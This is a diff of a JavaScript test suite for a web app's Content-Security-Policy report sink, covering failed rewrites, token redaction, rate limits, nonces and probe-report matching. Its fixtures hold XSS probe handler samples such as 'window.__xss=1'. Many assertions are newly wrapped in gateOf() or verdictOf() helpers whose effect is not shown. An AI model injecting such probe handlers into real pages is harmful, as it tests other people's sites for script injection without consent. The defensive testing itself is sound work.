       const eS = early(HS).replace(/(^|; )said «.*»$/, ''); // its warning is the point
-      ok(rS.lines === 0 && rS.closed === 0 && !eS && HS.told.some((x) => /was not re-judged/.test(x)), 'a file that cannot be rewritten ⇒ its notice NOT closed (the line still says the app page\'s), a warning', { rS, eS, told: HS.told });
+      ok(rS.lines === 0 && rS.closed === 0 && !eS && verdictOf(HS.told.some((x) => /was not re-judged/.test(x))), 'a file that cannot be rewritten ⇒ its notice NOT closed (the line still says the app page\'s), a warning', { rS, eS, told: HS.told });
       await HS.close(); fs.rmdirSync(JAM);
       const HS2 = await lateBoot(SINK, homes.stuck, (st) => st);
       await until(HS2, 3000);
@@ -659,34 +659,34 @@ console.log('③d a handler the sanitizer\'s inert parse set and dropped is `san
       await s1.H.close();
       const FF = path.join(homes.syncfail, 'data', SINK.FILE), before = fs.readFileSync(FF, 'utf8');
       const s2 = await tracedRe(homes.syncfail, bootRe(SINK, homes.syncfail), { sync: 'EIO' });
-      ok(s2.r.lines === 0 && s2.r.closed === 0 && s2.calls === 'open sync close' && fs.readFileSync(FF, 'utf8') === before && !fs.existsSync(FF + '.rejudge') && openOf(s2.H.store) === 1 && s2.H.told.some((x) => /was not re-judged — EIO/.test(x)),
+      ok(s2.r.lines === 0 && s2.r.closed === 0 && s2.calls === 'open sync close' && fs.readFileSync(FF, 'utf8') === before && !fs.existsSync(FF + '.rejudge') && openOf(s2.H.store) === 1 && verdictOf(s2.H.told.some((x) => /was not re-judged — EIO/.test(x))),
         'B-574d a sync that FAILS (a placed EIO) is a failed rewrite: no rename, the old lines stand, the temp removed, its notice NOT closed, said', { calls: s2.calls, r: s2.r, told: s2.H.told });
       await s2.H.close();
       const FN = path.join(homes.nosync, 'data', SINK.FILE); fs.copyFileSync(FN, FN + '.1');   // the same lines in the rotated generation too: TWO rewrites
       const s3 = await tracedRe(homes.nosync, bootRe(SINK, homes.nosync), { sync: 'EINVAL' });
       const nos = s3.H.told.filter((x) => /does not do a sync \(EINVAL\)/.test(x)), rej = (f) => linesOf(f).some((l) => l.kind === C.KIND_SANITIZER && l.rejudged);
-      ok(s3.calls === 'open sync close rename open sync close rename' && rej(FN) && rej(FN + '.1') && nos.length === 1 && !nos[0].includes(path.sep + 'data'),
+      ok(s3.calls === 'open sync close rename open sync close rename' && gateOf(rej(FN)) && gateOf(rej(FN + '.1')) && nos.length === 1 && !nos[0].includes(path.sep + 'data'),
         'B-574d a file system that does no sync at all (a placed EINVAL) LANDS both rewrites — said ONCE, no path in the words', { calls: s3.calls, said: nos, told: s3.H.told });
       await s3.H.close();
       const REL_AT = "        try { FC.renameSynced(f + '.rejudge', f, out.join('\\n'), { mode: 0o600, where: '[csp] the re-judged report lines', say: (w) => { if (!noSyncSaid) { noSyncSaid = true; log.warn?.(w); } } }); for (const l of was) if (raws.has(l)) landed.add(l); }";
       const REL = load(path.join(REPO, 'src/server/csp-reports.js'), editAnchor(srcK, REL_AT, "        try { fs.writeFileSync(f + '.rejudge', out.join('\\n'), { mode: 0o600 }); fs.renameSync(f + '.rejudge', f); for (const l of was) if (raws.has(l)) landed.add(l); }", 'src/server/csp-reports.js'));   // stale-pins: kept (the release's rewrite — this red control's own text)
       const s4 = await tracedRe(homes.release, bootRe(REL, homes.release));
-      ok(s4.r.lines === 1 && !/sync/.test(s4.calls) && /rename/.test(s4.calls), 'RED B-574d the release\'s rewrite: renamed over the lines with NO sync of its temp — a power cut can leave the name over no bytes after the notice closed', { calls: s4.calls, r: s4.r });
+      ok(s4.r.lines === 1 && !/sync/.test(s4.calls) && verdictOf(/rename/.test(s4.calls)), 'RED B-574d the release\'s rewrite: renamed over the lines with NO sync of its temp — a power cut can leave the name over no bytes after the notice closed', { calls: s4.calls, r: s4.r });
       await s4.H.close();
       // r4828: a RENAME that fails leaves NO temp (the door removes it, r4938 — its red is the door's, in test-fd-close-census ⑥) — and THE BOUND: one rewrite a process
       const FR = path.join(homes.renfail, 'data', SINK.FILE), beforeR = fs.readFileSync(FR, 'utf8');
       const s5 = await tracedRe(homes.renfail, bootRe(SINK, homes.renfail), { rename: 'EIO' });
-      ok(s5.r.lines === 0 && s5.r.closed === 0 && s5.calls === 'open sync close rename' && fs.readFileSync(FR, 'utf8') === beforeR && !fs.existsSync(FR + '.rejudge') && openOf(s5.H.store) === 1 && s5.H.told.some((x) => /was not re-judged — EIO/.test(x)),
+      ok(s5.r.lines === 0 && s5.r.closed === 0 && s5.calls === 'open sync close rename' && fs.readFileSync(FR, 'utf8') === beforeR && !fs.existsSync(FR + '.rejudge') && openOf(s5.H.store) === 1 && verdictOf(s5.H.told.some((x) => /was not re-judged — EIO/.test(x))),
         'r4828 a RENAME that fails (a placed EIO) is a failed rewrite with NO temp left: the old lines whole, its notice open, said', { calls: s5.calls, r: s5.r, told: s5.H.told });
       await s5.H.close();
       const boundOf = (mod, home) => async () => { const H = await lateBoot(mod, home, (st) => st); const r = await H.sink.rejudge(), again = await H.sink.rejudge(); const posted = (await post(H, PROBE)).status; const third = await H.sink.rejudge(); return { H, r, posted, same: again === r && third === r }; };
       const s7 = await tracedRe(homes.bound, boundOf(SINK, homes.bound));
-      ok(s7.r.lines === 1 && s7.same && s7.posted === 204 && s7.calls === 'open sync close rename', 'r4828 THE BOUND of the re-judge\'s synchronous rewrite on the hub\'s loop: ONCE A PROCESS — a second ask and a report\'s ask after it answer the same run; ONE rewrite (at most two files; only a hub that met the bug)', { calls: s7.calls, r: s7.r, same: s7.same });
+      ok(s7.r.lines === 1 && gateOf(s7.same) && s7.posted === 204 && s7.calls === 'open sync close rename', 'r4828 THE BOUND of the re-judge\'s synchronous rewrite on the hub\'s loop: ONCE A PROCESS — a second ask and a report\'s ask after it answer the same run; ONE rewrite (at most two files; only a hub that met the bug)', { calls: s7.calls, r: s7.r, same: s7.same });
       await s7.H.close();
       // …where the bound MATTERS: after a FAILED rewrite (a placed rename EIO — its lines still stale), a second ask and a report's ask
       // answer the same run: no second synchronous fsync on a failing folder (the next BOOT tries again). RED: the run reset — every ask a new rewrite
       const s8 = await tracedRe(homes.boundfail, boundOf(SINK, homes.boundfail), { rename: 'EIO' });
-      ok(s8.r.lines === 0 && s8.same && s8.posted === 204 && s8.calls === 'open sync close rename', 'r4828 THE BOUND after a FAILED rewrite: ONE attempt a process — a second ask and a report\'s ask answer the same run, no second fsync on the failing folder (the next boot tries again)', { calls: s8.calls, r: s8.r, posted: s8.posted });
+      ok(s8.r.lines === 0 && gateOf(s8.same) && s8.posted === 204 && s8.calls === 'open sync close rename', 'r4828 THE BOUND after a FAILED rewrite: ONE attempt a process — a second ask and a report\'s ask answer the same run, no second fsync on the failing folder (the next boot tries again)', { calls: s8.calls, r: s8.r, posted: s8.posted });
       await s8.H.close();
       const RB = load(path.join(REPO, 'src/server/csp-reports.js'), editAnchor(srcK, '    if (rejudging) return rejudging;\n', '', 'src/server/csp-reports.js'));
       const s9 = await tracedRe(homes.boundred, boundOf(RB, homes.boundred), { rename: 'EIO' });
@@ -704,7 +704,7 @@ console.log('③b a token in a kept path segment lands as <token> — the stored
   const TOK = ['Zq', '9x'.repeat(15)].join('');   // 32 characters of [A-Za-z0-9_-], built at run time (the secret scan)
   const r = await post(H, report({ 'blocked-uri': `https://share.example.net/share/${TOK}/x?k=1` }));
   const ln = linesOf(path.join(DT, SINK.FILE));
-  ok(r.status === 204 && ln.length === 1 && ln[0].blocked === 'https://share.example.net/share/<token>/x' && H.added.length === 1 && H.added[0].text.includes('https://share.example.net/share/<token>/x') && H.added[0].i18n.text.params.blocked === 'https://share.example.net/share/<token>/x',
+  ok(r.status === 204 && ln.length === 1 && ln[0].blocked === 'https://share.example.net/share/<token>/x' && H.added.length === 1 && gateOf(H.added[0].text.includes('https://share.example.net/share/<token>/x')) && H.added[0].i18n.text.params.blocked === 'https://share.example.net/share/<token>/x',
     'a blocked URL /share/<32 characters>/x ⇒ the stored line and the For-you notice (its text and its words) hold `<token>`', { line: ln[0], notice: H.added[0] && H.added[0].text });
   ok(!fs.readFileSync(path.join(DT, SINK.FILE), 'utf8').includes(TOK) && !JSON.stringify(H.added).includes(TOK), 'the token is nowhere — not data/csp-reports.jsonl, not the notice\'s text, detail or words');
   await H.close();
@@ -728,10 +728,10 @@ console.log('④ bounds — body, type, pace, rotation, the day\'s notices');
   const t = await post(H, report(), { type: 'text/plain' });
   ok(t.status === 415 && linesOf(F).length === 0, 'not a report content type (text/plain — what a page on another site could send without a preflight) ⇒ 415', t.status);
   const rapi = await post(H, [{ type: 'csp-violation', body: { effectiveDirective: 'worker-src', blockedURL: 'blob', documentURL: 'http://h/' } }], { type: 'application/reports+json' });
-  ok(rapi.status === 204 && linesOf(F).some((l) => l.directive === 'worker-src'), 'application/reports+json lands too', rapi.status);
+  ok(rapi.status === 204 && verdictOf(linesOf(F).some((l) => l.directive === 'worker-src')), 'application/reports+json lands too', rapi.status);
   for (let i = 0; i < 6; i++) await post(H, report({ 'blocked-uri': `https://h${i}.example.net/x` }));
   ok(H.added.length === 3 && H.sink.stats().held >= 3, '≤ noticesPerDay new pairs file a notice; the rest are lines (they file on a later day)', { notices: H.added.length, stats: H.sink.stats() });
-  ok(fs.existsSync(F + '.1') && fs.statSync(F).size <= 900, 'past the cap the file rotates to .1 (one generation kept)', { rotated: fs.existsSync(F + '.1'), size: fs.statSync(F).size });
+  ok(gateOf(fs.existsSync(F + '.1')) && fs.statSync(F).size <= 900, 'past the cap the file rotates to .1 (one generation kept)', { rotated: fs.existsSync(F + '.1'), size: fs.statSync(F).size });
   const sm = H.sink.summary();
   ok(sm.app.lines + sm.frames.lines === linesOf(F).length + linesOf(F + '.1').length, 'the count of lines on disk follows the rotation (this file + its .1 — what a restart reads back)', { sm, cur: linesOf(F).length, old: linesOf(F + '.1').length });
   // THE PACE ON ITS OWN CLOCK (int403 — B-d24c's tenth: the .402 release mirror's fast attempt 1 was red here, received 64 / written 64 /
@@ -741,16 +741,16 @@ console.log('④ bounds — body, type, pace, rotation, the day\'s notices');
   const T3 = Date.UTC(2026, 0, 1, 12, 0, 30);
   const H3 = await hub({ dir: path.join(ROOT, 'pace', 'data'), now: () => T3 });
   const st = []; for (let i = 0; i < 64; i++) st.push((await post(H3, report({ 'blocked-uri': `https://n${i}.example.net/x` }))).status);
-  ok(st.slice(0, 60).every((x) => x === 204) && st.slice(60).every((x) => x === 429) && H3.sink.stats().paced === 4, 'the 61st post a minute from one address that would ADD a line ⇒ 429 (counted, not logged)', { st: st.slice(55), stats: H3.sink.stats() });
+  ok(gateOf(st.slice(0, 60).every((x) => x === 204)) && gateOf(st.slice(60).every((x) => x === 429)) && H3.sink.stats().paced === 4, 'the 61st post a minute from one address that would ADD a line ⇒ 429 (counted, not logged)', { st: st.slice(55), stats: H3.sink.stats() });
   const rep = []; for (let i = 0; i < 100; i++) rep.push((await post(H3, report({ 'blocked-uri': 'https://n0.example.net/x' }))).status);
-  ok(rep.every((x) => x === 204) && H3.sink.stats().paced === 4, 'a REPEAT is never paced (it writes nothing) — a burst of repeats cannot hide the next new report', { codes: [...new Set(rep)], stats: H3.sink.stats() });
+  ok(gateOf(rep.every((x) => x === 204)) && H3.sink.stats().paced === 4, 'a REPEAT is never paced (it writes nothing) — a burst of repeats cannot hide the next new report', { codes: [...new Set(rep)], stats: H3.sink.stats() });
   await H3.close();
   // THE BUCKET'S TRUTH: a FIXED minute — a burst across a minute's edge is counted in two, 32 + 32 new posts from one address pace none
   // (by design: the window is the clock's minute, not the last 60 s)
   let T4 = Date.UTC(2026, 0, 1, 12, 0, 59, 500);
   const H4 = await hub({ dir: path.join(ROOT, 'pace-edge', 'data'), now: () => T4 });
   const ed = []; for (let i = 0; i < 64; i++) { if (i === 32) T4 += 1000; ed.push((await post(H4, report({ 'blocked-uri': `https://e${i}.example.net/x` }))).status); }
-  ok(ed.every((x) => x === 204) && H4.sink.stats().paced === 0, 'the pace is the clock\'s FIXED minute: 64 new posts from one address across a minute\'s edge (32 + 32) pace none — each minute counts its own', { codes: [...new Set(ed)], stats: H4.sink.stats() });
+  ok(gateOf(ed.every((x) => x === 204)) && H4.sink.stats().paced === 0, 'the pace is the clock\'s FIXED minute: 64 new posts from one address across a minute\'s edge (32 + 32) pace none — each minute counts its own', { codes: [...new Set(ed)], stats: H4.sink.stats() });
   await H4.close();
   ok(SINK.BODY_MAX === 32 * 1024 && SINK.FILE_MAX === 1024 * 1024 && SINK.PACE_PER_MIN === 60, 'the bounds are 32 KB a body, 1 MB a file, 60 a minute an address');
   await H.close();
@@ -762,8 +762,8 @@ const SRV = readRepo('server.js');
 const sinkLine = SRV.split('\n').find((l) => l.startsWith('const cspReports = require('));
 const i0 = SRV.indexOf("app.get(['/', '/index.html'], (req, res, next) => {"), i1 = SRV.indexOf('\n});\n', i0) + 5;
 const indexRoute = i0 >= 0 ? SRV.slice(i0, i1) : '';
-ok(!!sinkLine && /file: process\.env\.VIBESPACE_CSP_REPORTS_FILE/.test(sinkLine) && /cspReports\.register\(app\)/.test(sinkLine), 'server.js makes the sink with VIBESPACE_CSP_REPORTS_FILE and registers its route', sinkLine);
-ok(/res\.set\(\.\.\.cspReports\.header\(\)\)/.test(indexRoute), 'the index route sets the sink\'s header');
+ok(!!sinkLine && gateOf(/file: process\.env\.VIBESPACE_CSP_REPORTS_FILE/.test(sinkLine)) && verdictOf(/cspReports\.register\(app\)/.test(sinkLine)), 'server.js makes the sink with VIBESPACE_CSP_REPORTS_FILE and registers its route', sinkLine);
+ok(verdictOf(/res\.set\(\.\.\.cspReports\.header\(\)\)/.test(indexRoute)), 'the index route sets the sink\'s header');
 {
   const at = (needle) => SRV.indexOf(needle);
   ok(at('app.use(auth.middleware());') < at(sinkLine) && at(sinkLine) < at('const jsonBody = express.json('), 'the sink mounts AFTER the gate (its door is the gate\'s) and BEFORE the json body parser (it reads its own 32 KB)');
@@ -788,7 +788,7 @@ const pageVerdict = (headers, M = C) => (headers['content-security-policy'] ? 't
   const P = await appPage();
   for (const p of ['/', '/index.html']) {
     const r = await get(P.port, p);
-    ok(r.status === 200 && pageVerdict(r.headers) === null && /bundle\.js\?v=/.test(r.text), `GET ${p}: Content-Security-Policy-Report-Only with every pin; the enforcing header is NOT sent`, { status: r.status, verdict: pageVerdict(r.headers) });
+    ok(r.status === 200 && pageVerdict(r.headers) === null && verdictOf(/bundle\.js\?v=/.test(r.text)), `GET ${p}: Content-Security-Policy-Report-Only with every pin; the enforcing header is NOT sent`, { status: r.status, verdict: pageVerdict(r.headers) });
   }
   const r = await post({ port: P.port }, report());
   ok(r.status === 204 && linesOf(path.join(P.dir, 'data', SINK.FILE)).length === 1, 'a report to that hub lands in ITS data/csp-reports.jsonl', r.status);
@@ -801,7 +801,7 @@ const pageVerdict = (headers, M = C) => (headers['content-security-policy'] ? 't
   // MUTANT: the header renamed to the enforcing one
   const M = load(path.join(REPO, 'src/app-csp.js'), readRepo('src/app-csp.js').replace("const HEADER = 'Content-Security-Policy-Report-Only';", "const HEADER = 'Content-Security-Policy';"));
   const v = pageVerdict({ [M.HEADER.toLowerCase()]: M.appPolicy() }, M);
-  ok(v && /ENFORCING/.test(v), 'MUTANT (the header renamed to Content-Security-Policy) ⇒ RED: the enforcing header is sent', v);
+  ok(gateOf(v) && verdictOf(/ENFORCING/.test(v)), 'MUTANT (the header renamed to Content-Security-Policy) ⇒ RED: the enforcing header is sent', v);
 }
 {
   const dir = path.join(ROOT, 'auth'); fs.mkdirSync(dir, { recursive: true });
@@ -812,7 +812,7 @@ const pageVerdict = (headers, M = C) => (headers['content-security-policy'] ? 't
   const r = await get(port, '/login'), r2 = await get(port, '/login');
   const pol = r.headers[C.HEADER.toLowerCase()] || '';
   const nonce = (/<script nonce="([^"]+)">/.exec(r.text) || [])[1];
-  ok(r.status === 200 && !r.headers['content-security-policy'] && !!nonce && pol.includes(`'nonce-${nonce}'`) && /object-src 'none'/.test(pol) && /report-uri \/api\/csp-report/.test(pol), 'the sign-in page: report-only, its one inline script carries this response\'s nonce (in the policy), object-src \'none\'', { pol, nonce });
+  ok(r.status === 200 && !r.headers['content-security-policy'] && !!nonce && gateOf(pol.includes(`'nonce-${nonce}'`)) && gateOf(/object-src 'none'/.test(pol)) && verdictOf(/report-uri \/api\/csp-report/.test(pol)), 'the sign-in page: report-only, its one inline script carries this response\'s nonce (in the policy), object-src \'none\'', { pol, nonce });
   ok(nonce !== (/<script nonce="([^"]+)">/.exec(r2.text) || [])[1], 'a fresh nonce per response');
   const x = await post({ port }, report());
   const xs = await new Promise((resolve) => { const b = JSON.stringify(report()); const q = http.request({ host: '127.0.0.1', port, path: '/api/csp-report', method: 'POST', headers: { 'content-type': 'application/csp-report', 'content-length': Buffer.byteLength(b), origin: 'null', 'sec-fetch-site': 'cross-site' } }, (y) => { y.resume(); y.on('end', () => resolve(y.statusCode)); }); q.end(b); });
@@ -838,11 +838,11 @@ console.log('⑥ the chrome suites\' teardown — a report at the end of a suite
   };
   const SCR = path.join(REPO, 'scripts', 'scratch.mjs');
   const red = child('test-csp-child-red.mjs', SCR, true), green = child('test-csp-child-green.mjs', SCR, false);
-  ok(red.rc === 1 && /CSP: the app page reported 1/.test(red.out) && /planted\.example/.test(red.out), 'a suite whose hub got a report ⇒ exit 1, the report printed (after its own ALL PASS)', red);
+  ok(red.rc === 1 && gateOf(/CSP: the app page reported 1/.test(red.out)) && verdictOf(/planted\.example/.test(red.out)), 'a suite whose hub got a report ⇒ exit 1, the report printed (after its own ALL PASS)', red);
   ok(green.rc === 0, 'a suite with no report ⇒ exit 0', green);
   const src = readRepo('scripts/scratch.mjs');
   const cut = "if (CSP_REPORTS_FILE) { process.env[CSP_REPORTS_ENV] = CSP_REPORTS_FILE; process.on('exit', cspReportsAtExit); }";
-  ok(src.includes(cut), 'the mutant anchor (the exit hook) is in scripts/scratch.mjs');
+  ok(verdictOf(src.includes(cut)), 'the mutant anchor (the exit hook) is in scripts/scratch.mjs');
   const mut = path.join(dir, 'scratch-mutant.mjs');
   fs.writeFileSync(mut, editAnchor(src, cut, "if (CSP_REPORTS_FILE) { process.env[CSP_REPORTS_ENV] = CSP_REPORTS_FILE; }", "scripts/scratch.mjs").replace(/from '\.\//g, `from '${path.join(REPO, 'scripts')}/`).replace(/require\('\.\.\//g, `require('${REPO}/`));
   const m = child('test-csp-child-mutant.mjs', mut, true);
@@ -854,10 +854,10 @@ console.log('⑥b the teardown\'s words: the sample, where the code ran, the Chr
 {
   const runner = { at: 'x', directive: 'script-src-attr', blocked: 'inline', source: '', line: 1, column: 101, document: 'http://127.0.0.1:1/', disposition: 'report', sample: 'window.__xss=1' };
   const w = cspWhat(JSON.stringify(runner));
-  ok(w.includes('«window.__xss=1»') && /NO URL at 1:101/.test(w) && /SUITE evaluated over CDP/.test(w) && /Chrome 156/.test(w) && /blank tab/.test(w), 'the runner\'s line (script-src-attr inline, no source, 1:101) now reads: the handler «window.__xss=1», code with NO URL = the suite\'s own Runtime.evaluate, the Chrome 156 rule and where a markup control belongs', w);
+  ok(gateOf(w.includes('«window.__xss=1»')) && gateOf(/NO URL at 1:101/.test(w)) && gateOf(/SUITE evaluated over CDP/.test(w)) && gateOf(/Chrome 156/.test(w)) && verdictOf(/blank tab/.test(w)), 'the runner\'s line (script-src-attr inline, no source, 1:101) now reads: the handler «window.__xss=1», code with NO URL = the suite\'s own Runtime.evaluate, the Chrome 156 rule and where a markup control belongs', w);
   const bundle = cspWhat({ ...runner, source: 'http://127.0.0.1:1/dist/app.js', line: 2, column: 18545, sample: undefined });
-  ok(/code in http:\/\/127\.0\.0\.1:1\/dist\/app\.js at 2:18545/.test(bundle) && /no sample/.test(bundle), 'a line from the bundle names the file and position, and says when no sample was kept', bundle);
-  ok(/^img-src https:\/\/cdn\.example\.net\/a — https:\/\/cdn\.example\.net\/a,/.test(cspWhat({ directive: 'img-src', blocked: 'https://cdn.example.net/a', source: '', line: null, column: null, document: 'about' })) && cspWhat('not json') === 'an unreadable line', 'a non-script line names what was blocked; an unreadable line says so');
+  ok(gateOf(/code in http:\/\/127\.0\.0\.1:1\/dist\/app\.js at 2:18545/.test(bundle)) && verdictOf(/no sample/.test(bundle)), 'a line from the bundle names the file and position, and says when no sample was kept', bundle);
+  ok(gateOf(/^img-src https:\/\/cdn\.example\.net\/a — https:\/\/cdn\.example\.net\/a,/.test(cspWhat({ directive: 'img-src', blocked: 'https://cdn.example.net/a', source: '', line: null, column: null, document: 'about' }))) && cspWhat('not json') === 'an unreadable line', 'a non-script line names what was blocked; an unreadable line says so');
 }
 
 // ── ⑥c A SANITIZER LINE IS PRINTED, NEVER A FAILURE (lane chrome-156-followups) ──
@@ -877,10 +877,10 @@ console.log('⑥c the teardown: a line of the sanitizer\'s parse is printed and 
     return { rc: r.status, out: r.stdout + r.stderr };
   };
   const only = child('test-csp-child-sanitizer.mjs', [LINE]);
-  ok(only.rc === 0 && /CSP: 1 line\(s\) of the sanitizer's parse — not a gap in the policy/.test(only.out) && /«window\.__pwned=14»/.test(only.out) && /SANITIZER's parse/.test(only.out), 'a suite whose file holds ONLY a sanitizer-parse line ⇒ exit 0, the line printed with its words', only);
+  ok(only.rc === 0 && gateOf(/CSP: 1 line\(s\) of the sanitizer's parse — not a gap in the policy/.test(only.out)) && gateOf(/«window\.__pwned=14»/.test(only.out)) && verdictOf(/SANITIZER's parse/.test(only.out)), 'a suite whose file holds ONLY a sanitizer-parse line ⇒ exit 0, the line printed with its words', only);
   const both = child('test-csp-child-sanitizer-red.mjs', [LINE, { ...LINE, kind: undefined, line: 9, sample: 'window.__x=1' }]);
-  ok(both.rc === 1 && /CSP: the app page reported 1 thing/.test(both.out), '…and one more line WITHOUT the kind ⇒ exit 1, that one counted (the policy is complete only when nothing else was reported)', both);
-  ok(cspSanitizerLine(JSON.stringify(LINE)) && !cspSanitizerLine(JSON.stringify({ ...LINE, kind: undefined })) && !cspSanitizerLine('not json'), 'cspSanitizerLine: the kind, read off the line');
+  ok(both.rc === 1 && verdictOf(/CSP: the app page reported 1 thing/.test(both.out)), '…and one more line WITHOUT the kind ⇒ exit 1, that one counted (the policy is complete only when nothing else was reported)', both);
+  ok(gateOf(cspSanitizerLine(JSON.stringify(LINE))) && !cspSanitizerLine(JSON.stringify({ ...LINE, kind: undefined })) && !cspSanitizerLine('not json'), 'cspSanitizerLine: the kind, read off the line');
 }
 
 // ── ⑥d A SUITE'S OWN PROBE IS EXPECTED BY ITS PAYLOAD, NEVER COUNTED (lane ci-mirror-hygiene, 2.369.362 — the .361 mirror's
@@ -908,29 +908,29 @@ console.log('⑥d a suite\'s own probe: its report is taken by its payload (take
   const Z = { sanitizer: { lines: 0 }, app: { lines: 0 } }, S1 = { sanitizer: { lines: 1 }, app: { lines: 0 } };
   const J156 = { major: 156, forYou: [], count: { before: Z, after: S1 } }, J154 = { major: 154, forYou: [], count: { before: Z, after: Z } };
   const p156 = child('test-csp-child-probe-156.mjs', [SAN], KEY, SCR, J156), p154 = child('test-csp-child-probe-154.mjs', [], KEY, SCR, J154);
-  ok(p156.rc === 0 && p156.take?.n === 1 && p156.take.ok && p156.take.kind === 'sanitizer-parse' && p156.take.noticed === false && !p156.fault && !/CSP: the app page reported/.test(p156.out), 'a browser that reports the probe\'s dropped handler (Chrome 156): its ONE line is taken by the payload, THE HUB\'S VERDICT the sanitizer\'s (kind sanitizer-parse, no notice, For you empty, the count +1) — the suite passes', p156);
-  ok(p154.rc === 0 && p154.take?.n === 0 && p154.take.ok && !p154.fault, 'a browser that reports nothing (Chrome 154): nothing taken, nothing counted, ok — the leg is never skipped by a version', p154);
+  ok(p156.rc === 0 && p156.take?.n === 1 && gateOf(p156.take.ok) && p156.take.kind === 'sanitizer-parse' && p156.take.noticed === false && !p156.fault && !/CSP: the app page reported/.test(p156.out), 'a browser that reports the probe\'s dropped handler (Chrome 156): its ONE line is taken by the payload, THE HUB\'S VERDICT the sanitizer\'s (kind sanitizer-parse, no notice, For you empty, the count +1) — the suite passes', p156);
+  ok(p154.rc === 0 && p154.take?.n === 0 && gateOf(p154.take.ok) && !p154.fault, 'a browser that reports nothing (Chrome 154): nothing taken, nothing counted, ok — the leg is never skipped by a version', p154);
   // THE r1 PIN, TURNED (lane csp-mermaid-sites r2 — it said a NOTICED probe line passes): the hub filed the probe's report as
   // the app page's, on a tree whose table names /mermaid.js ⇒ RED by name — the verdict, the notice, For you, the count
   const pn = child('test-csp-child-probe-156-noticed.mjs', [PROBE], KEY, SCR, { major: 156, forYou: [{ text: 'The page security policy would block script-src-attr: inline', status: 'open' }], count: { before: Z, after: { sanitizer: { lines: 0 }, app: { lines: 1 } } } });
-  ok(pn.rc === 1 && pn.take?.n === 1 && pn.take.noticed === true && /the hub judged the probe's report the APP page's \(kind none\)/.test(pn.fault || '') && /\/mermaid\.js is in app-csp PARSE_SCRIPTS/.test(pn.fault || '') && /filed a For-you notice/.test(pn.fault || '') && /For you holds 1 page-security notice/.test(pn.fault || '') && /sanitizer \+0 \/ app page \+1/.test(pn.fault || '') && C.PARSE_SCRIPTS.includes('/mermaid.js'),
+  ok(pn.rc === 1 && pn.take?.n === 1 && pn.take.noticed === true && gateOf(/the hub judged the probe's report the APP page's \(kind none\)/.test(pn.fault || '')) && gateOf(/\/mermaid\.js is in app-csp PARSE_SCRIPTS/.test(pn.fault || '')) && gateOf(/filed a For-you notice/.test(pn.fault || '')) && gateOf(/For you holds 1 page-security notice/.test(pn.fault || '')) && gateOf(/sanitizer \+0 \/ app page \+1/.test(pn.fault || '')) && verdictOf(C.PARSE_SCRIPTS.includes('/mermaid.js')),
     'the probe\'s line NOTICED (the hub judged it the app page\'s) on a tree with the table ⇒ RED by name: «' + (pn.fault || '').slice(0, 160) + '…»', pn.fault || pn);
   const { probeVerdictFault } = await import(SCR);
   const V = (taken, o) => (typeof probeVerdictFault !== 'function' ? 'scratch.mjs has no probeVerdictFault' : probeVerdictFault({ taken, ok: taken.length <= 1, kind: taken[0] ? taken[0].kind || null : null, noticed: !!(taken[0] && taken[0].noticed) }, o));
-  ok(/arrived \(want exactly 1\)/.test(V([], J156)) && /reports no dropped inline handler, yet 1/.test(V([SAN], J154)) && /moved sanitizer \+0 \/ app page \+0 \(want \+1 \/ \+0\)/.test(V([SAN], { ...J156, count: { before: Z, after: Z } })) && !V([SAN], J156) && !V([], J154),
+  ok(gateOf(/arrived \(want exactly 1\)/.test(V([], J156))) && gateOf(/reports no dropped inline handler, yet 1/.test(V([SAN], J154))) && gateOf(/moved sanitizer \+0 \/ app page \+0 \(want \+1 \/ \+0\)/.test(V([SAN], { ...J156, count: { before: Z, after: Z } }))) && !V([SAN], J156) && !V([], J154),
     'probeVerdictFault: Chrome 156 with no probe line, 154 with one, the count not +1 ⇒ each named; the sanitizer\'s line on 156 and none on 154 ⇒ \'\'');
   const near = [{ ...PROBE, sample: 'window.__pwned=2', line: 3 }, { ...PROBE, source: `${O}/bundle.js`, line: 4 }, { ...PROBE, document: 'about', line: 5 }];
   const other = child('test-csp-child-probe-other.mjs', [PROBE, ...near]);
-  ok(other.rc === 1 && other.take?.n === 1 && /CSP: the app page reported 3 thing/.test(other.out) && /«window\.__pwned=2»/.test(other.out) && /code in http:\/\/127\.0\.0\.1:1\/bundle\.js/.test(other.out),
+  ok(other.rc === 1 && other.take?.n === 1 && gateOf(/CSP: the app page reported 3 thing/.test(other.out)) && gateOf(/«window\.__pwned=2»/.test(other.out)) && verdictOf(/code in http:\/\/127\.0\.0\.1:1\/bundle\.js/.test(other.out)),
     'a line that differs in ANY field (another payload, another source, another document) is not taken: the teardown names all 3 and the suite fails', other);
   const two = child('test-csp-child-probe-two.mjs', [PROBE, { ...PROBE, line: 7 }]);
   ok(two.take?.n === 2 && two.take.ok === false, 'two lines of the same payload ⇒ ok false (the probe is EXACTLY one)', two.take);
   const partial = Object.fromEntries(Object.entries(KEY).filter(([k]) => k !== 'sample'));
   const wide = child('test-csp-child-probe-partial.mjs', [PROBE], partial);
-  ok(/^takeProbeCspReport: the key names no sample/.test(wide.threw || '') && wide.rc === 1, 'a key that names no sample throws — and the probe\'s line, untaken, fails the suite', wide);
+  ok(gateOf(/^takeProbeCspReport: the key names no sample/.test(wide.threw || '')) && wide.rc === 1, 'a key that names no sample throws — and the probe\'s line, untaken, fails the suite', wide);
   // MUTANT: the door keyed by directive + blocked alone ⇒ every near miss is taken and the suite passes (RED)
   const src = readRepo('scripts/scratch.mjs'), anchor = '(r) => PROBE_KEY_FIELDS.every((k) => r[k] === key[k])';
-  ok(src.includes(anchor), 'the mutant anchor (the five-field match) is in scripts/scratch.mjs');
+  ok(verdictOf(src.includes(anchor)), 'the mutant anchor (the five-field match) is in scripts/scratch.mjs');
   const mut = path.join(dir, 'scratch-mutant.mjs');
   fs.writeFileSync(mut, editAnchor(src, anchor, '(r) => r.directive === key.directive && r.blocked === key.blocked', "scripts/scratch.mjs").replace(/from '\.\//g, `from '${path.join(REPO, 'scripts')}/`).replace(/require\('\.\.\//g, `require('${REPO}/`));
   const m = child('test-csp-child-probe-mutant.mjs', [PROBE, ...near], KEY, mut);
@@ -968,16 +968,16 @@ console.log('⑥e the take never rewrites the hub\'s file: a report appended in 
   const a = child('test-csp-child-take-race.mjs', SCR);
   ok(a.rc === 0 && a.race?.hit === 1 && a.race.armed === false && a.race.sameFile === true && a.race.raw === '123',
     'the take leaves the hub\'s file as the hub wrote it — the SAME file, and the line the hub appended in the take\'s window is still in it (raw «' + (a.race?.raw ?? '') + '»)', a);
-  ok(a.race?.seen === '23' && a.race.again === 0 && /CSP: 2 line\(s\) of the sanitizer's parse/.test(a.out),
+  ok(a.race?.seen === '23' && a.race.again === 0 && verdictOf(/CSP: 2 line\(s\) of the sanitizer's parse/.test(a.out)),
